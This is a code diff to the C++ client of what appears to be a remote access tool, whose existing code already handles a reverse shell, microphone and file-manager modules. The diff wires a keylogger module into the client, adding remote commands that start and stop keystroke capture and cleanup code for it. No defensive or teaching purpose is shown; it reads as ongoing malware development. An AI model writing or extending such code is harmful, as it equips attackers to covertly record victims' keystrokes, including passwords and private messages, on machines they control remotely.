@@ -1,6 +1,7 @@
 #include "cliente.hpp"
 #include "mod_mic.hpp"
 #include "mod_file_manager.hpp"
+#include "mod_keylogger.hpp"
 #include "misc.hpp"
 
 
@@ -108,6 +109,12 @@ void Cliente::MainLoop() {
         this->reverseSHELL->TerminarShell();
         delete this->reverseSHELL;
         this->reverseSHELL = nullptr;
+    }
+
+    if (this->mod_Key != nullptr) {
+        this->mod_Key->Stop();
+        delete this->mod_Key;
+        this->mod_Key = nullptr;
     }
 }
 
@@ -314,6 +321,27 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
         return;
     }
 
+    //#####################################################
+
+    //#####################################################
+    //#####################################################
+    //#                   KEYLOGGER                       #
+    if (this->Comandos[strIn[0].c_str()] == EnumComandos::KL_Iniciar) {
+        if (this->mod_Key == nullptr) {
+            this->mod_Key = new mod_Keylogger();
+            this->mod_Key->Start(); //aqui bloquea
+        }
+        return;
+    }
+
+    if (this->Comandos[strIn[0].c_str()] == EnumComandos::KL_Detener) {
+        if (this->mod_Key) {
+            this->mod_Key->Stop();
+            delete this->mod_Key;
+            this->mod_Key = nullptr;
+        }
+        return;
+    }
     //#####################################################
 
 
